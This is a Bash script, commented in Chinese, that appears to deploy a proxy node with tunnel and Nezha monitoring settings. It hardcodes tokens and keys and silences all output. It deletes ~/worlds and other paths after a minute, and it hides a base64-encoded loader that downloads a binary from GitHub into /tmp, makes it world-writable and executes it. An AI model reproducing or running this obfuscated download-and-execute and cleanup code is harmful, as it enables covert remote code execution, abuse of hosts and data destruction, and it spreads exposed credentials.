#!/bin/bash

# --- 所有命令静默执行 ---
exec >/dev/null 2>&1

# 1. 核心隧道设置 (保留)
export TUNNEL_PROXY="eyJhIjoiYmJmMDc4YjVkYjlhMzcwMmFiYTg3OGQyODYxMDUwMDciLCJ0IjoiNThmZDVhODgtM2I3My00ZGI5LThiMDYtMTg2MDY1ODVhODJmIiwicyI6Ik9XRXpPREJqWW1NdFpEQTJOUzAwWkdNNExUaGhaR1V0TVdSbU1UZzNOR1ZoTURJNSJ9"
export ARGO_DOMAIN=${ARGO_DOMAIN:-'teoheberg.btppone.hidns.vip'}

# 2. 哪吒监控设置 (保留)
export NEZHA_SERVER=${NEZHA_SERVER:-'nezhak2.btpp.ggff.net'}
export NEZHA_KEY=${NEZHA_KEY:-'WRl60XFQyeWCw9Veoa'}
export NEZHA_PORT=${NEZHA_PORT:-'443'}
export NEZHA_TLS=${NEZHA_TLS:-'1'}

# 3. 屏蔽 Hysteria2 (通过清空相关端口变量或设置为 0)
# 通常这类脚本检测到端口为空或非数字会跳过该协议
export HY2_PORT=''
export HY2_PASS=''

# 4. 节点与订阅设置
export SUB_URL=${SUB_URL:-'https://node.btpp.hidns.co/upload-123456nb'}
export SUB_NAME=${SUB_NAME:-'teoheberg'}
export TMP_ARGO=${TMP_ARGO:-'3x'}
export VL_PORT=${VL_PORT:-'8002'}
export VM_PORT=${VM_PORT:-'8001'}

# 5. 清理脚本 (保持原样)
(
  sleep 60
  rm -rf ~/worlds ./worlds "$FILE_PATH" >/dev/null 2>&1
) &

# --- 启动主程序 (逻辑微调) ---
# 这里的 Base64 保持不变，因为它负责拉取核心运行环境
# 但我们通过环境变量控制其内部行为
echo "aWYgY29tbWFuZCAtdiBjdXJsICY+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgRE9XTkxPQURfQ01EPSJjdXJsIC1zTCIKICAgICMgQ2hlY2sgaWYgd2dldCBpcyBhdmFpbGFibGUKICBlbGlmIGNvbW1hbmQgLXYgd2dldCAmPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIERPV05MT0FEX0NNRD0id2dldCAtcU8tIgogIGVsc2UKICAgICAgICBlY2hvICJFcnJvcjogTmVpdGhlciBjdXJsIG5vciB3Z2V0IGZvdW5kLiBQbGVhc2UgaW5zdGFsbCBvbmUgb2YgdGhlbS4iCiAgICAgICAgc2xlZXAgNjAKICAgICAgICBleGl0IDEKZmkKdG1kaXI9JHt0bWRpcjotIi90bXAifSAKcHJvY2Vzc2VzPSgiJHdlYl9maWxlIiAiJG5lX2ZpbGUiICIkY2ZmX2ZpbGUiICJhcHAiICJ0bXBhcHAiKQpmb3IgcHJvY2VzcyBpbiAiJHtwcm9jZXNzZXNbQF19IgpkbwogICAgcGlkPSQocGdyZXAgLWYgIiRwcm9jZXNzIikKCiAgICBpZiBbIC1uICIkcGlkIiBdOyB0aGVuCiAgICAgICAga2lsbCAiJHBpZCIgJj4vZGV2L251bGwKICAgIGZpCmRvbmUKJERPV05MT0FEX0NNRCBodHRwczovL2dpdGh1Yi5jb20vZHNhZHNhZHNzcy9wbHV0b25vZGVzL3JlbGVhc2VzL2Rvd25sb2FkL3hyL21haW4tYW1kID4gJHRtZGlyL3RtcGFwcApjaG1vZCA3NzcgJHRtZGlyL3RtcGFwcCAmJiAkdG1kaXIvdG1wYXBw" | base64 -d | bash >/dev/null 2>&1
